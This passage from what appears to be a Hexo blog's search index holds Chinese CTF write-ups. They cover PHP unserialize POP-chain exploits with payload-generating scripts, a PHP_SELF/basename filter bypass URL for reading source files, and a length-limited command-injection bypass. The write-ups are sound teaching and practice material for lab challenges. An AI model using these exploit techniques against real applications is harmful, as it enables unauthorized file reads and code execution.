class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pkshow</span> </span><br><span class="hljs-class"></span>&#123;  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo_name</span>(<span class="hljs-params"></span>)     </span><br><span class="hljs-function">  </span>&#123;          <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Pk very safe^.^&quot;</span>;      <br>  &#125;  <br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span> </span><br><span class="hljs-class"></span>&#123;   <br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cinder</span>;  <br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">  </span>&#123;      <br>    <span class="hljs-variable language_">$this</span>-&gt;cinder = <span class="hljs-keyword">new</span> pkshow;<br>  &#125;  <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function">  </span>&#123;          <br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;cinder))  <br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;cinder-&gt;<span class="hljs-title function_ invoke__">echo_name</span>();      <br>  &#125;  <br>&#125;  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;    <br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;     <br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>; <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo_name</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function">  </span>&#123;   <br>    <span class="hljs-variable language_">$this</span>-&gt;openstack = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;docker);<br>    <span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="hljs-variable">$heat</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;nova)<br>    &#123;<br>      <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;./<span class="hljs-subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>))         <br>      &#123;              <br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>); <br>      &#125;  <br>      <span class="hljs-keyword">else</span> <br>      &#123; <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;keystone lost~&quot;</span>; <br>      &#125;    <br>    &#125;<br>  &#125;  <br>&#125;  <br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pks&#x27;</span>]))  <br>&#123;<br>  <span class="hljs-variable">$logData</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pks&#x27;</span>]);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$logData</span>; <br>&#125; <br><span class="hljs-keyword">else</span> <br>&#123; <br>  <span class="hljs-title function_ invoke__">highlight_file</span>(__file__); <br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>return file_get_contents($file);</code>代码审计可以发现唯一能利用的是这个函数<br>然后只能通过acp类触发<br>acp只能通过题目给的<code>echo $logData;</code>来触发</p><ul><li>第一个问题就是cinder是受保护的属性，所以不能直接在类外修改</li></ul><p>那么只能通过<code>__construct()</code> 来进行修改</p><ul><li>第二个问题是要进入循环则需要强比较neutron和nova，这里有两个可行的方法</li></ul><p>1.给docker赋值成一个序列化的字符串<br>2.别管docker，它就本身就是一个null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cinder</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cinder = <span class="hljs-keyword">new</span> ace;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">acp</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//记得url编码</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cinder</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cinder = <span class="hljs-keyword">new</span> ace;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>=<span class="hljs-string">&#x27;O:4:&quot;fake&quot;:2:&#123;s:7:&quot;neutron&quot;;i:1;s:4:&quot;nova&quot;;R:2;&#125;&#x27;</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">acp</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//记得url编码</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后在得到的页面检查源代码发现flag在另一个文件夹里<br>继续改变参数读取就行</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【NISACTF 2022】popchains</title>
    <link href="/2024/07/26/%5BNISACTF%202022%5Dpopchains/"/>
    <url>/2024/07/26/%5BNISACTF%202022%5Dpopchains/</url>
    
    <content type="html"><![CDATA[<p>进来就是源码直接奉上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php">Happy New Year~ MAKE A WISH<br>  <span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]))&#123;<br>  @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">/***************************pop your 2022*****************************/</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-variable">$file</span>;<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;page;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;page)) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You can Not Enter 2022&quot;</span>;<br>      <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-string">&quot;index.php&quot;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>  <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;effort = <span class="hljs-keyword">array</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>    <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;effort;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>  &#125;<br>&#125;<br><span class="hljs-comment">/**********************Try to See flag.php*****************************/</span><br></code></pre></td></tr></table></figure><p>审计代码<br>发现只有include能利用来进行文件包含读取flag所以用include作为结尾开始构造poc<br>先来介绍几个用得到的魔术方法<br>__toString， 类被当成字符串时的回应方法<br>__wakeup()，执行unserialize()时，先会调用这个函数<br>__invoke()，调用函数的方式调用一个对象时的回应方法<br>__get()，调用一个不存在的成员变量触发<br><br>想要调用append函数只能通过触发invoke方法来调用<br>调用invoke则需要触发get方法<br>get方法需要通过触发toString来触发<br>toString方法就只能通过本类里面的wakeup方法来进行触发</p><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Make_a_Change</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;page = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-keyword">string</span>-&gt;effort = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Try_Work_Hard</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyP</title>
    <link href="/2024/07/15/EasyP/"/>
    <url>/2024/07/15/EasyP/</url>
    
    <content type="html"><![CDATA[<p><strong>先上源码</strong>   题目是这个[鹤城杯2021]EasyP<br><br><img src="/2024/07/15/EasyP/1.png"><br>进来就看到一个post传参传guess我傻傻的看了半天不知道secret是啥，后来才知道是迷惑我的<br>然后就开始考虑正则了，先解释三个函数<br><br><code>$_SERVER[&#39;PHP_SELF&#39;]</code><br>这个是指代调用脚本的路径<br>比如说这个题目它的值就是&#x2F;index.php<br>如果你访问的是<br><a href="http://127.0.0.1/index.php/utils.php">http://127.0.0.1/index.php/utils.php</a><br>那么它的值就会是&#x2F;index.php&#x2F;utils.php<br><br><code>$_SERVER[&#39;REQUEST_URI&#39;]</code><br>这个跟上面那个函数的区别就是会把后面的参数内容也包含进去<br><br><code>basename</code><br><img src="/2024/07/15/EasyP/2.png"><br>接下来就是要绕过正则了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125; <br>这个正则的意思是检查调用脚本的路径末尾是不是utils.php，比如你的脚本<br>路径是aaa/bbbb那么路径末尾就是最后一个/后面的东西<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125; <br>这个正则就需要用到php的特性了  [  (空格)  + 　.<br>上面那几个字符任何一个都行，都可以被处理成_<br></code></pre></td></tr></table></figure><p>最后是关于basename的绕过了，这个函数有个特点<br>如果传入的参数中出现了非ascii字符则会把它给丢弃，中文就不是ascii字符</p><p>那么直接上payload<br><a href="http://node4.anna.nssctf.cn:28192/index.php/utils.php/%E5%85%83%E7%A5%9E%E8%BF%98%E6%98%AF%E5%8E%9F%E7%A5%9E?show.source=1">http://node4.anna.nssctf.cn:28192/index.php/utils.php/元神还是原神?show.source=1</a></p><p>还有一个为什么要加一个index.php的问题<br>peekaboo大佬的wp里面：<br>为什么前面需要添加一个&#x2F;index.php呢<br>因为当我们传入index.php&#x2F;utils.php时，仍然请求的是index.php，<br>但是当basename()处理后，highlight_file()得到的参数就变成了utils.php，从而我们就实现了任意文件包含</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【2024XTCTF】牢牢记住，逝者为大</title>
    <link href="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/"/>
    <url>/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/</url>
    
    <content type="html"><![CDATA[<p>题目源码是这样的（这里借鉴的是官方的wp，因为我没写出来wwwww）<br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/1.png"><br>这里有几个限制<br>1.注释<br>2.后面的脏数据<br>3.传入cmd的长度要在13个字符以内<br>4.限制命令执行的字符</p><p>首先我们先过注释符<br>只要加一个换行符就能绕过了，%0a<br>然后是脏数据，加个 ; 和注释 # 即可绕过，注意传注释符的时候要url编一下码就是 ;%23<br>我们限制已经消耗掉了三个字符，还有9个字符可用，9个字符，常规的方法是很难构造了，但是<br>我们有个反引号<br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/2.png"><br>php里的反引号调用的是方法 shell_exec() ，用于执行系统命令，那么我们就可以直接在里面<br>执行命令了…吗？<br>虽然可以执行执行命令比如我们(‘.’是当前目录)<br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/3.png"></p><p>不多不少刚刚好9个字符能把根目录里的东西复制过来，然后直接访问静态资源flag就能直接读取 了，但是非常可惜，会触发”肘死你”或者”what can i say”，就没有办法拯救牢大了 那么我们换一种思路，我们用另一个变量往里面传参，那么就能不受长度的限制自由构造了 <br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/4.png"></p><p>我们只要往1传参就能传到里面去，就能自由执行命令了，但是要注意的是，这种方法是无回显 的，无回显也问题不大，用上面的方法把flag复制一下然后直接访问就行，或者直接弹shell <br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/5.png"></p><p>用 ‘’ 来绕过过滤的 cp ，但是我们可以看到通配符是给过滤了的，我们就可以引出第二个技巧， [a-z] ，linux里用中括号可以根据ascii码来匹配里面的字符集， [a-z] 就是匹配任何小写字母a 到z中的一个字符，那么我们就能简单的构造出想要的字符了 payload: <br><img src="/2024/07/14/%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7/6.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/07/13/hello-world/"/>
    <url>/2024/07/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
